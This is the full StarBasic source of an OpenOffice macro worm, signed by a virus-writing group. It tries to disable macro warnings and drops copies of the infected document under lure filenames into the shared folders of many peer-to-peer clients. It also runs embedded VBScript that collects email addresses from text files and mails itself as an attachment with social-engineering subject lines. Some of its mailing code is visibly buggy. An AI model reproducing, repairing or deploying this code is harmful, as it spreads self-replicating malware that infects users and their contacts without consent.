Sub wangxun()
rem Ooo.Wangxun by Necronomikon[D00mRiderz]
Dim mEventProps(1) as new com.sun.star.beans.PropertyValue
mEventProps(0).Name = "EventType"
mEventProps(0).Value = "StarBasic"
mEventProps(1).Name = "Script"
mEventProps(1).Value = "macro://ThisComponent/Standard.wangxun.bla"
end sub
sub bla
if GetGUIType =1 then
call blah
else
call msg
end if
end sub
sub blah
Dim dirz As String
Dim dummy()
Dim iVar As Integer
Dim Args(0) as new com.sun.star.beans.PropertyValue
Args(0).Name = "MacroExecutionMode"
Args(0).Value = _
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
ThisComponent.LockControllers 
oMailer = createUnoService( "com.sun.star.system.SimpleSystemMail" )
MailProgramm = omailer.querySimpleMailClient()
oleService = createUnoService("com.sun.star.bridge.OleObjectFactory")
WSH=oleService.createInstance("MSScriptControl.ScriptControl")

iVar = Int((15 * Rnd) -2)
Select Case iVar
Case 1 To 3
files= "HalfLife2-Episode2_cheats.odt"
Case 4 To 6
files= "Pet Soccer.odt"
Case 7, 8
files= "Fifa2007_cheats.odt"
Case Is > 8 And iVar < 11
files= "Nexuiz Full v2_1 Installation Guide.odt"
Case Else
files= "how to cook humans.odt"
End Select
datei="c:\temp.odt"
dateiurl=converttourl(datei)
odoc=thisComponent
odoc.storeasurl(dateiurl,dummy())
dirz=Environ ("programfiles")
If dirz = "" Then dirz=Environ("programfiles")
Filecopy "c:\temp.odt" ,"c:\test1.odt"

if ( Dir(dirz &"\Kazaa\My Shared Folder\") <> "") then
Filecopy "c:\test1.odt" ,  dirz &"\Kazaa\My Shared Folder\"& files
end if
if ( Dir(dirz &"\bearshare\shared\") <> "") then
Filecopy "c:\temp.odt" ,  dirz &"\bearshare\shared\" &files
end if
if ( Dir(dirz &"\eDonkey2000\incoming\") <> "") then
Filecopy "c:\temp.odt" ,  dirz &"\eDonkey2000\incoming\" &files
end if
if ( Dir(dirz &"\kazaa lite\my shared folder\") <> "") then
Filecopy "c:\temp.odt" ,  dirz &"\kazaa lite\my shared folder\" &files
end if
if ( Dir(dirz &"\kmd\my shared folder\") <> "") then
Filecopy "c:\temp.odt" ,  dirz &"\kmd\my shared folder\"& files 
end if
if ( Dir(dirz &"\grokster\my grokster\") <> "") then
Filecopy "c:\temp.odt" ,  dirz &"\grokster\my grokster\" &files
end if
if ( Dir(dirz &"\morpheus\my shared folder\") <> "") then
Filecopy "c:\temp.odt" ,  dirz &"\morpheus\my shared folder\" &files
end if
if ( Dir(dirz &"\limewire\shared\") <> "") then
Filecopy "c:\temp.odt" ,  dirz &"\limewire\shared\" &files
end if
if ( Dir(dirz &"\AppleJuice\Incoming\") <> "") then
Filecopy "c:\temp.odt" ,  dirz &"\AppleJuice\Incoming\" &files
end if
if ( Dir(dirz &"\?shar?\") <> "") then
Filecopy "c:\temp.odt" ,  dirz &"\?shar?\" &files
end if
if ( Dir(dirz &"\icq\shared files\") <> "") then
Filecopy "c:\temp.odt" ,  dirz &"\icq\shared files\" &files
end if
WSH.Language = "VBScript" 'thx Genetix for this code
vbs=vbs+"Dim Data_, addr"+Chr(10)
vbs=vbs+"Start_dir = ""."""+Chr(10)
vbs=vbs+"set FSO=createobject(""scripting.filesystemobject"")"+Chr(10)
vbs=vbs+"Set Dir = FSO.GetFolder(Start_dir)"+Chr(10)
vbs=vbs+"getInfo(Dir)"+Chr(10)
vbs=vbs+"Function getInfo(CurrentDir)"+Chr(10)
vbs=vbs+"on error resume next"+Chr(10)
vbs=vbs+"For Each Item In CurrentDir.Files"+Chr(10)
vbs=vbs+"Data_ = "" : addr = """+Chr(10)
vbs=vbs+"If LCase(Right(Cstr(Item.Name), 3)) = ""txt"" Then"+Chr(10)
vbs=vbs+"Set open_ = FSO.OpenTextFile(Item.Name, 1)"+Chr(10)
vbs=vbs+"Do While Not open_.AtEndOfLine"+Chr(10)
vbs=vbs+"Data_ = open_.ReadLine "+Chr(10)
vbs=vbs+"addr = Split(Data_, "" "")"+Chr(10)
vbs=vbs+"For mail = 0 To UBound(addr)"+Chr(10)
vbs=vbs+"If InStr(addr(mail), ""@"") then"+Chr(10)
vbs=vbs+"MsgBox Trim(addr(mail))"+Chr(10)
vbs=vbs+"end if"+Chr(10)
vbs=vbs+"next"+Chr(10)
vbs=vbs+"loop"+Chr(10)
vbs=vbs+"End If"+Chr(10)
vbs=vbs+"Next"+Chr(10)
vbs=vbs+"for each Item In CurrentDir.SubFolders"+Chr(10)
vbs=vbs+"getInfo(Item)"+Chr(10)
vbs=vbs+"Next"+Chr(10)
vbs=vbs+"End Function"
WSH.ExecuteStatement(vbs)

xVar = Int((15 * Rnd) -2)
Select Case xVar
Case 1 To 3
mailmsg= "check this message commin from me..."
Case 4 To 6
mailmsg= "Delivery reports about your e-mail"
Case 7, 8
mailmsg= "News from Gamerheaven"
Case Is > 8 And iVar < 11
mailmsg= "without this you would be nothing. ;)"
Case Else
mailmsg= "still inlove with...?"
End Select

newmsg = MailProgramm.createSimpleMailMessage()
newmsg.setRecipient("addr(mail)")
newmsg.setSubject( " &mailmsg& " )
Dim attachs(0)
attachs(0)="file:///c:/"& files 
newmsg.setAttachement(attachs())
Mailprogramm.sendSimpleMailMessage(newmsg, 0 )
wait 20000
kill "c:\test1.odt"
wait 2000
kill "c:\temp.odt"
oDoc.store()
End Sub

Sub msg ()
msgbox "no windows...:("
End Sub
